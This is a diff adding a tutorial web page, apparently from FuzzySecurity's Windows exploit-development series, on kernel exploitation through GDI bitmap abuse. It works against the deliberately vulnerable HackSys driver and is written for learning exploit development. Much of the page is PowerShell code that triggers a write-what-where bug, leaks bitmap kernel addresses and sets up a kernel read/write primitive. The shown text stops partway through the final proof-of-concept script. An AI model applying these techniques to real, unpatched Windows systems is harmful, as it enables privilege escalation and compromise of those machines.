@@ -1,0 +1,1437 @@
+<!DOCTYPE html>
+<!--[if lt IE 7 ]><html class="ie ie6" lang="en"> <![endif]-->
+<!--[if IE 7 ]><html class="ie ie7" lang="en"> <![endif]-->
+<!--[if IE 8 ]><html class="ie ie8" lang="en"> <![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!--><html lang="en"> <!--<![endif]-->
+<head>
+
+  <!-- Basic Page Needs -->
+  <meta charset="utf-8">
+  <title>FuzzySecurity | Windows ExploitDev: Part 17</title>
+  <meta name="description" content="">
+  <meta name="author" content="">
+
+  <!-- CSS Style -->
+  <link rel="stylesheet" href="../../css/style.css"> 
+  
+  <!-- Color Skins -->
+  <link rel="stylesheet" href="../../css/skins/red.css" name="skins"> 
+  
+  <!-- Layout Style -->
+  <link rel="stylesheet" href="../../css/layout/wide.css" name="layout"> 
+  
+  <!-- Small Icons -->
+  <link rel="stylesheet" href="../../css/icons.css">  
+  
+  <!-- SyntaxHighlighter -->
+  <link type="text/css" rel="stylesheet" href="../../css/shCoreEmacs.css"/>
+  
+  <!-- Start JavaScript -->
+  
+    <script src="../../js/jquery-1.7.2.min.js"></script> <!-- jQuery library -->
+    <script src="../../js/jquery.easing.1.3.min.js"></script> <!-- jQuery Easing --> 
+    <script src="../../js/jquery-ui.min.js"></script> <!-- jQuery Ui --> 
+    <script src="../../js/jquery.cookie.js"></script> <!-- jQuery cookie --> 
+    <script src="../../js/jquery.uniform.min.js"></script> <!-- jQuery Uniform -->
+    <script src="../../js/ddsmoothmenu.js"></script> <!-- Nav Menu ddsmoothmenu -->
+    <script src="../../js/jquery.flexslider.js"></script> <!-- Flex Slider  -->
+    <script src="../../js/jquery.eislideshow.js"></script> <!-- Elastic Slider  -->
+    <script src="../../js/jquery.iconmenu.js"></script> <!-- Sliding Text and Icon Menu Style  -->
+    <script src="../../js/colortip.js"></script> <!-- Colortip Tooltip Plugin  -->
+    <script src="../../js/tytabs.js"></script> <!-- jQuery Plugin tytabs  -->
+    <script src="../../js/carousel.js"></script> <!-- jQuery Carousel  -->
+    <script src="../../js/jquery.prettyPhoto.js"></script> <!-- jQuery Prettyphoto  -->
+    <script src="../../js/jquery.isotope.min.js"></script> <!-- Isotope Filtering  -->
+    <script src="../../js/selectnav.js"></script> <!-- Responsive Navigation Menu by SelectNav -->
+    <script src="../../js/jquery.ui.totop.js"></script> <!-- UItoTop plugin  -->
+    <script src="../../js/custom.js"></script> <!-- Custom Js file for javascript in html -->
+    
+    <!-- SyntaxHighlighter -->
+	<script type="text/javascript" src="../../js/shCore.js"></script>
+	<script type="text/javascript" src="../../js/shBrushCpp.js"></script>
+	<script type="text/javascript" src="../../js/shBrushPowerShell.js"></script>
+    <script type="text/javascript">SyntaxHighlighter.all();</script>
+  
+  <!-- End JavaScript -->
+
+  <!--[if lt IE 9]>
+      <script src="js/html5.js"></script>
+  <![endif]-->
+
+  <!-- Favicons -->
+  <link rel="shortcut icon" href="../../images/favicon/favicon.ico">
+  <link rel="apple-touch-icon" href="../../images/favicon/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="72x72" href="../../images/favicon/apple-touch-icon-72x72.png">
+  <link rel="apple-touch-icon" sizes="114x114" href="../../images/favicon/apple-touch-icon-114x114.png">
+
+</head>
+<body>
+
+  <div id="wrap" class="boxed">
+
+  <header>
+    <div class="container clearfix">
+    
+      <div class="five columns">
+        <div class="logo">
+        <a href="index.html">
+          <img src="../../images/logo.png" alt="FuzzySec" />
+        </a>
+        </div>
+      </div><!-- End Logo -->
+      
+      <div class="eleven columns">
+        <nav id="menu" class="navigation">
+          <ul id="nav">
+            <li><a href="../../index.html">Home</a>
+            </li>
+            <li><a href="../../tutorials.html" class="active">Tutorials</a>
+            </li>
+            <li><a href="../../coding.html">Scripting</a>
+            </li>
+            <li><a href="../../exploits.html">Exploits</a>
+            </li>
+            <li><a href="../../links.html">Links</a>
+            </li>
+            <li><a href="../../patreon.html">Patreon</a></li><li><a href="../../contact.html">Contact</a></li>
+          </ul> 
+        </nav>
+      </div><!-- End Menu -->
+      
+      
+      <div class="sixteen columns"><hr /></div>
+      
+    </div><!-- End Container -->
+  </header><!-- <<< End Header >>> -->
+  
+  <div class="container clearfix">
+  
+    <div class="page-columns">
+    
+    <ul class="breadcrumbs">
+      <li><a href="index.html"><span class="icon home gray"></span></a></li>
+          <li><a href="../../index.html">Home</a> <b>&#187;</b></li>
+          <li><a href="../../tutorials.html">Tutorials</a> <b>&#187;</b></li>
+          <li>Kernel Exploitation: GDI Bitmap Abuse (Win7-10 32/64bit)</li>
+      </ul>
+      
+      <!-- section 16 Columns -->
+      
+      <div class="recent-work gallery clearfix">
+      <div class="eighteen columns bottom">
+	<div style="height:20px;" align="right">
+		<link type="text/css" rel="stylesheet" href="https://www.fuzzysecurity.com/css/patreon.css"/>
+		<button class="btn btn-2 btn-2g"><a href="https://www.patreon.com/FuzzySec" target="_blank"><img src="https://c5.patreon.com/external/logo/become_a_patron_button.png" style="border-radius: 10px;height:40px;"></a></button>
+	</div>
+        <h2 class="title">Part 17: Kernel Exploitation -> GDI Bitmap Abuse (Win7-10 32/64bit)<span class="line"></span></h2>
+        <p>Hello and welcome! We are, once again, diving into ring0 with <a href="https://twitter.com/HackSysTeam">@HackSysTeam's</a> driver. In this post we will be revisiting the write-what-where vulnerability. By implementing a powerful ring0 read/write primitive we can create an exploit that works on Windows 7, 8, 8.1 and 10 (pre v1607) and targets both 32 and 64 bit architectures! As we will see, this technique is essentially a data attack so we will painlessly circumvent SMEP/SMAP/CFG/RFG => winning!<br /><br />
+		
+		This technique is slightly "complicated" and requires some prior knowledge on the part of the reader so I highly recommend that the resources below are reviewed before starting on this post. Finally, to keep things fresh we will be developing our exploit on a 64-bit Windows 10 host. Enough introductory nonsense, let's get to it!<br /><br />
+      
+      <span style="color: #ffffff;"><strong>Resources:</strong></span><br />
+      + HackSysTeam-PSKernelPwn (<a href="https://twitter.com/FuzzySec">@FuzzySec</a>) - <a href="https://github.com/FuzzySecurity/HackSysTeam-PSKernelPwn">here</a><br />
+      + Abusing GDI for ring0 exploit primitives (<a href="https://twitter.com/CoreSecurity">@CoreSecurity</a>) - <a href="https://www.coresecurity.com/blog/abusing-gdi-for-ring0-exploit-primitives">here</a><br />
+	  + Abusing GDI Reloaded (<a href="https://twitter.com/CoreSecurity">@CoreSecurity</a>) - <a href="https://www.coresecurity.com/system/files/publications/2016/10/Abusing-GDI-Reloaded-ekoparty-2016_0.pdf">here</a><br />
+	  + This Time Font hunt you down in 4 bytes (<a href="https://twitter.com/keen_lab">@keen_lab</a>) - <a href="http://www.slideshare.net/PeterHlavaty/windows-kernel-exploitation-this-time-font-hunt-you-down-in-4-bytes">here</a><br />
+	  + Terminus Project (<a href="https://twitter.com/rwfpl">@rwfpl</a>) - <a href="http://terminus.rewolf.pl/terminus/">here</a><br /></p><br />
+	  
+<div class="fourteen columns bottom">
+<h2 class="title">Recon the challenge<span class="line"></span></h2>
+<p>We are rehashing the write-what-where vulnerability from <a href="http://www.fuzzysecurity.com/tutorials/expDev/15.html">part 11</a> of this series so we won't go over the entire analysis again. We just want to make sure our arbitrary write still works as expected on Win 10.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+  
+public static class EVD
+{
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern IntPtr CreateFile(
+        String lpFileName,
+        UInt32 dwDesiredAccess,
+        UInt32 dwShareMode,
+        IntPtr lpSecurityAttributes,
+        UInt32 dwCreationDisposition,
+        UInt32 dwFlagsAndAttributes,
+        IntPtr hTemplateFile);
+  
+    [DllImport("Kernel32.dll", SetLastError = true)]
+    public static extern bool DeviceIoControl(
+        IntPtr hDevice,
+        int IoControlCode,
+        byte[] InBuffer,
+        int nInBufferSize,
+        byte[] OutBuffer,
+        int nOutBufferSize,
+        ref int pBytesReturned,
+        IntPtr Overlapped);
+}
+"@
+
+$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
+  
+if ($hDevice -eq -1) {
+    echo "`n[!] Unable to get driver handle..`n"
+    Return
+} else {
+    echo "`n[>] Driver information.."
+    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"
+    echo "[+] Handle: $hDevice"
+}
+
+
+[byte[]]$Buffer = [System.BitConverter]::GetBytes(0x4141414141414141) + [System.BitConverter]::GetBytes(0x4242424242424242)
+echo "`n[>] Sending buffer.."
+echo "[+] Buffer length: $($Buffer.Length)"
+echo "[+] IOCTL: 0x22200B"
+[EVD]::DeviceIoControl($hDevice, 0x22200B, $Buffer, $Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null</pre>
+</div>
+
+<p>We seem to get the expected result, as shown below.</p>
+
+<p>&nbsp;</p>
+<img src="images/Kernel_GDI_1.png">
+<p>&nbsp;</p>
+
+<p>You may remember from <a href="http://www.fuzzysecurity.com/tutorials/expDev/15.html">part 11</a> that this is not entirely as it appears. The value we are writing is not in fact 0x4141414141414141 it is the pointer stored at that address. Also, our POC only works on 64 bit. We would do well to keep our exploit architecture independent from the start!<br /><br />
+
+We can modify the buffer structure as show below to get the arbitrary write we want on 32/64 bit.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+# [IntPtr]$WriteWhatPtr->$WriteWhat + $WriteWhere
+#---
+[IntPtr]$WriteWhatPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.BitConverter]::GetBytes($WriteWhat).Length)
+[System.Runtime.InteropServices.Marshal]::Copy([System.BitConverter]::GetBytes($WriteWhat), 0, $WriteWhatPtr, [System.BitConverter]::GetBytes($WriteWhat).Length)
+if ($x32Architecture) {
+	[byte[]]$Buffer = [System.BitConverter]::GetBytes($WriteWhatPtr.ToInt32()) + [System.BitConverter]::GetBytes($WriteWhere)
+} else {
+	[byte[]]$Buffer = [System.BitConverter]::GetBytes($WriteWhatPtr.ToInt64()) + [System.BitConverter]::GetBytes($WriteWhere)
+}</pre>
+</div>
+
+<p>As long as pass in the appropriate variables, this should now work universally.</p>
+
+<h2 class="title">Pwn all the things!<span class="line"></span></h2>
+<p><span style="color: #ffffff;"><strong>Game Plan</strong></span><br /><br />
+That's the easy part done. What we want to do now is turn a single arbitrary write into a full ring0 read/write primitive. At a high level we will (1) create two bitmap objects, (2) leak their respective kernel addresses, (3) use our arbitrary write to modify a header element for one of the bitmap objects and (4) use the the Gdi32 GetBitmapBits/SetBitmapBits API calls to read from and write to kernel space!</p>
+
+<p>&nbsp;</p>
+<center><img src="images/Kernel_GDI_2.png" width="40%" height="40%"></center>
+<p>&nbsp;</p>
+
+<p><span style="color: #ffffff;"><strong>Leaking Bitmap Kernel Objects</strong></span><br /><br />
+The crucial part of this technique is that, when creating a bitmap, we can leak the address of the bitmap object in the kernel. This leak was patched by Microsoft in v1607 of Windows 10 (aka the anniversary patch) => crycry.<br /><br />
+
+As it turns out, when a bitmap is created, a struct is added to the GdiSharedHandleTable in the parent process PEB. Given the base address of the process PEB, the GdiSharedHandleTable is located at the following offsets (32/64 bit respectively).</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+[StructLayout(LayoutKind.Explicit, Size = 256)]
+public struct _PEB
+{
+	[FieldOffset(148)]
+	public IntPtr GdiSharedHandleTable32;
+	[FieldOffset(248)]
+	public IntPtr GdiSharedHandleTable64;
+}</pre>
+</div>
+
+<p>This PEB entry is simply a pointer to an array of GDICELL structs which define a number of different image types. The definition of this struct can be seen below.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+/// 32bit size: 0x10
+/// 64bit size: 0x18
+[StructLayout(LayoutKind.Sequential)]
+public struct _GDI_CELL
+{
+	public IntPtr pKernelAddress;
+	public UInt16 wProcessId;
+	public UInt16 wCount;
+	public UInt16 wUpper;
+	public UInt16 wType;
+	public IntPtr pUserAddress;
+}</pre>
+</div>
+
+<p>Let's use the following POC to see if we can manually find the _GDI_CELL struct in KD.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+  
+public static class EVD
+{
+	[DllImport("gdi32.dll")]
+	public static extern IntPtr CreateBitmap(
+		int nWidth,
+		int nHeight,
+		uint cPlanes,
+		uint cBitsPerPel,
+		IntPtr lpvBits);
+}
+"@
+
+[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x64*0x64*4)
+$Bitmap = [EVD]::CreateBitmap(0x64, 0x64, 1, 32, $Buffer)
+"{0:X}" -f [int]$Bitmap</pre>
+</div>
+
+<p>We run the POC and get back a bitmap handle, immediately it seems obvious that this is not a standard handle value returned by so many Windows API calls (it is much too large).</p>
+
+<p>&nbsp;</p>
+<img src="images/Kernel_GDI_3.png">
+<p>&nbsp;</p>
+
+<p>In fact, thanks to no cleverness on my part, the last two bytes of bitmap handles are actually the index for the struct in the GdiSharedHandleTable array (=> handle & 0xffff). Knowing this, let's jump in KD and see if we can find the _GDI_CELL struct for our newly created bitmap!</p>
+
+<p>&nbsp;</p>
+<img src="images/Kernel_GDI_4.png">
+<p>&nbsp;</p>
+
+<p>With the pointer to the GdiSharedHandleTable array, all we need to do is add the struct index times the struct size (0x18 on 64bit).
+
+<p>&nbsp;</p>
+<img src="images/Kernel_GDI_5.png">
+<p>&nbsp;</p>
+
+<p><a href="http://processhacker.sourceforge.net/">Process hacker</a> has a very useful feature which allows us to list GDI object handles. We can use this to confirm the values we found in KD.</p>
+
+<p>&nbsp;</p>
+<img src="images/Kernel_GDI_6.png">
+<p>&nbsp;</p>
+
+<p>Sw33t! For our ring0 primitive we need to collect this information programmatically for two bitmaps (a manager and a worker). As we were able to see, it's just some simple math based on the bitmap handle. The only question is how do we get the base address for the process PEB. Fortunately the undocumented, NtQueryInformationProcess function comes to the rescue. When called with the ProcessBasicInformation class (0x0), the function returns a struct which contains the base address of the PEB. I won't go into further detail on this as it is a well understood technique, hopefully the POC below will clear up any doubts!</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+
+[StructLayout(LayoutKind.Sequential)]
+public struct _PROCESS_BASIC_INFORMATION
+{
+	public IntPtr ExitStatus;
+	public IntPtr PebBaseAddress;
+	public IntPtr AffinityMask;
+	public IntPtr BasePriority;
+	public UIntPtr UniqueProcessId;
+	public IntPtr InheritedFromUniqueProcessId;
+}
+
+/// Partial _PEB
+[StructLayout(LayoutKind.Explicit, Size = 256)]
+public struct _PEB
+{
+	[FieldOffset(148)]
+	public IntPtr GdiSharedHandleTable32;
+	[FieldOffset(248)]
+	public IntPtr GdiSharedHandleTable64;
+}
+
+[StructLayout(LayoutKind.Sequential)]
+public struct _GDI_CELL
+{
+	public IntPtr pKernelAddress;
+	public UInt16 wProcessId;
+	public UInt16 wCount;
+	public UInt16 wUpper;
+	public UInt16 wType;
+	public IntPtr pUserAddress;
+}
+
+public static class EVD
+{
+	[DllImport("ntdll.dll")]
+	public static extern int NtQueryInformationProcess(
+		IntPtr processHandle, 
+		int processInformationClass,
+		ref _PROCESS_BASIC_INFORMATION processInformation,
+		int processInformationLength,
+		ref int returnLength);
+
+	[DllImport("gdi32.dll")]
+	public static extern IntPtr CreateBitmap(
+		int nWidth,
+		int nHeight,
+		uint cPlanes,
+		uint cBitsPerPel,
+		IntPtr lpvBits);
+}
+"@
+
+#==============================================[PEB]
+
+# Flag architecture $x32Architecture/!$x32Architecture
+if ([System.IntPtr]::Size -eq 4) {
+	echo "`n[>] Target is 32-bit!"
+	$x32Architecture = 1
+} else {
+	echo "`n[>] Target is 64-bit!"
+}
+# Current Proc handle
+$ProcHandle = (Get-Process -Id ([System.Diagnostics.Process]::GetCurrentProcess().Id)).Handle
+# Process Basic Information
+$PROCESS_BASIC_INFORMATION = New-Object _PROCESS_BASIC_INFORMATION
+$PROCESS_BASIC_INFORMATION_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($PROCESS_BASIC_INFORMATION)
+$returnLength = New-Object Int
+$CallResult = [EVD]::NtQueryInformationProcess($ProcHandle, 0, [ref]$PROCESS_BASIC_INFORMATION, $PROCESS_BASIC_INFORMATION_Size, [ref]$returnLength)
+# PID & PEB address
+echo "`n[?] PID $($PROCESS_BASIC_INFORMATION.UniqueProcessId)"
+if ($x32Architecture) {
+	echo "[+] PebBaseAddress: 0x$("{0:X8}" -f $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt32())"
+} else {
+	echo "[+] PebBaseAddress: 0x$("{0:X16}" -f $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64())"
+}
+# Lazy PEB parsing
+$_PEB = New-Object _PEB
+$_PEB = $_PEB.GetType()
+$BufferOffset = $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64()
+$NewIntPtr = New-Object System.Intptr -ArgumentList $BufferOffset
+$PEBFlags = [system.runtime.interopservices.marshal]::PtrToStructure($NewIntPtr, [type]$_PEB)
+# GdiSharedHandleTable
+if ($x32Architecture) {
+	echo "[+] GdiSharedHandleTable: 0x$("{0:X8}" -f $PEBFlags.GdiSharedHandleTable32.ToInt32())"
+} else {
+	echo "[+] GdiSharedHandleTable: 0x$("{0:X16}" -f $PEBFlags.GdiSharedHandleTable64.ToInt64())"
+}
+# _GDI_CELL size
+$_GDI_CELL = New-Object _GDI_CELL
+$_GDI_CELL_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($_GDI_CELL)
+
+#==============================================[/PEB]
+
+#==============================================[Bitmap]
+
+echo "`n[>] Creating Bitmaps.."
+
+# Manager Bitmap
+[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x64*0x64*4)
+$ManagerBitmap = [EVD]::CreateBitmap(0x64, 0x64, 1, 32, $Buffer)
+echo "[+] Manager BitMap handle: 0x$("{0:X}" -f [int]$ManagerBitmap)"
+if ($x32Architecture) {
+	$HandleTableEntry = $PEBFlags.GdiSharedHandleTable32.ToInt32() + ($($ManagerBitmap -band 0xffff)*$_GDI_CELL_Size)
+	echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt32]$HandleTableEntry)"
+    $ManagerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)
+	echo "[+] Bitmap Kernel address: 0x$("{0:X8}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)))"
+} else {
+	$HandleTableEntry = $PEBFlags.GdiSharedHandleTable64.ToInt64() + ($($ManagerBitmap -band 0xffff)*$_GDI_CELL_Size)
+	echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt64]$HandleTableEntry)"
+    $ManagerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)
+	echo "[+] Bitmap Kernel address: 0x$("{0:X16}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)))"
+}
+
+# Worker Bitmap
+[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x64*0x64*4)
+$WorkerBitmap = [EVD]::CreateBitmap(0x64, 0x64, 1, 32, $Buffer)
+echo "[+] Worker BitMap handle: 0x$("{0:X}" -f [int]$WorkerBitmap)"
+if ($x32Architecture) {
+	$HandleTableEntry = $PEBFlags.GdiSharedHandleTable32.ToInt32() + ($($WorkerBitmap -band 0xffff)*$_GDI_CELL_Size)
+	echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt32]$HandleTableEntry)"
+    $WorkerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)
+	echo "[+] Bitmap Kernel address: 0x$("{0:X8}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)))"
+} else {
+	$HandleTableEntry = $PEBFlags.GdiSharedHandleTable64.ToInt64() + ($($WorkerBitmap -band 0xffff)*$_GDI_CELL_Size)
+	echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt64]$HandleTableEntry)"
+    $WorkerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)
+	echo "[+] Bitmap Kernel address: 0x$("{0:X16}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)))"
+}
+
+#==============================================[/Bitmap]</pre>
+</div>
+
+<p>&nbsp;</p>
+<img src="images/Kernel_GDI_7.png">
+<p>&nbsp;</p>
+
+<p>Notice that our script is architecture independent! That is one part of the puzzle solved, but why do we care about these bitmap objects?<br /><br />
+
+<span style="color: #ffffff;"><strong>_BASEOBJECT -> _SURFOBJ -> pvScan0</strong></span><br /><br />
+The bitmap kernel address we leaked above points to the following GDI base object struct in kernel space.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+/// 32bit size: 0x10
+/// 64bit size: 0x18
+[StructLayout(LayoutKind.Sequential)]
+public struct _BASEOBJECT
+{
+	public IntPtr hHmgr;
+	public UInt32 ulShareCount;
+	public UInt16 cExclusiveLock;
+	public UInt16 BaseFlags;
+	public UIntPtr Tid;
+}</pre>
+</div>
+
+<p>We are not super interested in this information, if you want to review the base object struct in more detail please refer to the the ReactOS wiki <a href="https://www.reactos.org/wiki/Techwiki:Win32k/BASEOBJECT">here</a>. Right after this header there is a specific struct which varies based on the type of object. For bitmaps, this is the <a href="https://msdn.microsoft.com/en-us/library/ff569901.aspx">surface object</a> structure which can be seen below.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+/// 32bit size: 0x34
+/// 64bit size: 0x50
+[StructLayout(LayoutKind.Sequential)]
+public struct _SURFOBJ
+{
+	public IntPtr dhsurf;
+	public IntPtr hsurf;
+	public IntPtr dhpdev;
+	public IntPtr hdev;
+	public IntPtr sizlBitmap;
+	public UIntPtr cjBits;
+	public IntPtr pvBits;
+	public IntPtr pvScan0; /// offset => 32bit = 0x20 & 64bit = 0x38
+	public UInt32 lDelta;
+	public UInt32 iUniq;
+	public UInt32 iBitmapFormat;
+	public UInt16 iType;
+	public UInt16 fjBitmap;
+}</pre>
+</div>
+
+<p>The pvScan0 element is what we want! This element is a pointer to the first scan line of the bitmap. From our leaked kernel address we can use the following to calculate the offset to this element.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+# 32 bit
+[IntPtr]pvScan0_32 = $pKernelAddress + 0x30
+
+# 64 bit
+[IntPtr]pvScan0_64 = $pKernelAddress + 0x50</pre>
+</div>
+
+<p>Still, the question is, why do we care? Well, there are two GDI32 API calls, <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/dd144850(v=vs.85).aspx">GetBitmapBits</a> and <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/dd162962(v=vs.85).aspx">SetBitmapBits</a> which directly operate on the value of this element. GetBitmapBits allows us to read an arbitrary amount of bytes at the pvScan0 address, while SetBitmapBits allows us to write an arbitrary amount of bytes at the pvScan0 address. Can you smell the pwnage yet?<br /><br />
+
+We can briefly update our POC to include the pvScan0 offsets for the manager and worker bitmaps.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+# 32 bit
+# IntPtr at $HandleTableEntry = pKernelAddress
+$BitmapScan0_32 = $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)) + 0x30
+
+# 64 bit
+# IntPtr at $HandleTableEntry = pKernelAddress
+$BitmapScan0_64 = $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)) + 0x50</pre>
+</div>
+
+<p>&nbsp;</p>
+<p><span style="color: #ffffff;"><strong>GDI ring0 primitive</strong></span><br /><br />
+From here on out it is fairly easy to get our ring0 primitive working. Basically, using our arbitrary write we want to set the pvScan0 address for the "manager" bitmap to point at the pvScan0 address of the "worker" bitmap.
+
+Putting everything we have done so far together we come up with the following POC.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+
+[StructLayout(LayoutKind.Sequential)]
+public struct _PROCESS_BASIC_INFORMATION
+{
+	public IntPtr ExitStatus;
+	public IntPtr PebBaseAddress;
+	public IntPtr AffinityMask;
+	public IntPtr BasePriority;
+	public UIntPtr UniqueProcessId;
+	public IntPtr InheritedFromUniqueProcessId;
+}
+
+/// Partial _PEB
+[StructLayout(LayoutKind.Explicit, Size = 256)]
+public struct _PEB
+{
+	[FieldOffset(148)]
+	public IntPtr GdiSharedHandleTable32;
+	[FieldOffset(248)]
+	public IntPtr GdiSharedHandleTable64;
+}
+
+[StructLayout(LayoutKind.Sequential)]
+public struct _GDI_CELL
+{
+	public IntPtr pKernelAddress;
+	public UInt16 wProcessId;
+	public UInt16 wCount;
+	public UInt16 wUpper;
+	public UInt16 wType;
+	public IntPtr pUserAddress;
+}
+
+public static class EVD
+{
+	[DllImport("ntdll.dll")]
+	public static extern int NtQueryInformationProcess(
+		IntPtr processHandle, 
+		int processInformationClass,
+		ref _PROCESS_BASIC_INFORMATION processInformation,
+		int processInformationLength,
+		ref int returnLength);
+
+	[DllImport("gdi32.dll")]
+	public static extern IntPtr CreateBitmap(
+		int nWidth,
+		int nHeight,
+		uint cPlanes,
+		uint cBitsPerPel,
+		IntPtr lpvBits);
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern IntPtr CreateFile(
+        String lpFileName,
+        UInt32 dwDesiredAccess,
+        UInt32 dwShareMode,
+        IntPtr lpSecurityAttributes,
+        UInt32 dwCreationDisposition,
+        UInt32 dwFlagsAndAttributes,
+        IntPtr hTemplateFile);
+  
+    [DllImport("Kernel32.dll", SetLastError = true)]
+    public static extern bool DeviceIoControl(
+        IntPtr hDevice,
+        int IoControlCode,
+        byte[] InBuffer,
+        int nInBufferSize,
+        byte[] OutBuffer,
+        int nOutBufferSize,
+        ref int pBytesReturned,
+        IntPtr Overlapped);
+}
+"@
+
+#==============================================[PEB]
+
+# Flag architecture $x32Architecture/!$x32Architecture
+if ([System.IntPtr]::Size -eq 4) {
+	echo "`n[>] Target is 32-bit!"
+	$x32Architecture = 1
+} else {
+	echo "`n[>] Target is 64-bit!"
+}
+# Current Proc handle
+$ProcHandle = (Get-Process -Id ([System.Diagnostics.Process]::GetCurrentProcess().Id)).Handle
+# Process Basic Information
+$PROCESS_BASIC_INFORMATION = New-Object _PROCESS_BASIC_INFORMATION
+$PROCESS_BASIC_INFORMATION_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($PROCESS_BASIC_INFORMATION)
+$returnLength = New-Object Int
+$CallResult = [EVD]::NtQueryInformationProcess($ProcHandle, 0, [ref]$PROCESS_BASIC_INFORMATION, $PROCESS_BASIC_INFORMATION_Size, [ref]$returnLength)
+# PID & PEB address
+echo "`n[?] PID $($PROCESS_BASIC_INFORMATION.UniqueProcessId)"
+if ($x32Architecture) {
+	echo "[+] PebBaseAddress: 0x$("{0:X8}" -f $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt32())"
+} else {
+	echo "[+] PebBaseAddress: 0x$("{0:X16}" -f $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64())"
+}
+# Lazy PEB parsing
+$_PEB = New-Object _PEB
+$_PEB = $_PEB.GetType()
+$BufferOffset = $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64()
+$NewIntPtr = New-Object System.Intptr -ArgumentList $BufferOffset
+$PEBFlags = [system.runtime.interopservices.marshal]::PtrToStructure($NewIntPtr, [type]$_PEB)
+# GdiSharedHandleTable
+if ($x32Architecture) {
+	echo "[+] GdiSharedHandleTable: 0x$("{0:X8}" -f $PEBFlags.GdiSharedHandleTable32.ToInt32())"
+} else {
+	echo "[+] GdiSharedHandleTable: 0x$("{0:X16}" -f $PEBFlags.GdiSharedHandleTable64.ToInt64())"
+}
+# _GDI_CELL size
+$_GDI_CELL = New-Object _GDI_CELL
+$_GDI_CELL_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($_GDI_CELL)
+
+#==============================================[/PEB]
+
+#==============================================[Bitmap]
+
+echo "`n[>] Creating Bitmaps.."
+
+# Manager Bitmap
+[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x64*0x64*4)
+$ManagerBitmap = [EVD]::CreateBitmap(0x64, 0x64, 1, 32, $Buffer)
+echo "[+] Manager BitMap handle: 0x$("{0:X}" -f [int]$ManagerBitmap)"
+if ($x32Architecture) {
+	$HandleTableEntry = $PEBFlags.GdiSharedHandleTable32.ToInt32() + ($($ManagerBitmap -band 0xffff)*$_GDI_CELL_Size)
+	echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt32]$HandleTableEntry)"
+    $ManagerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)
+	echo "[+] Bitmap Kernel address: 0x$("{0:X8}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)))"
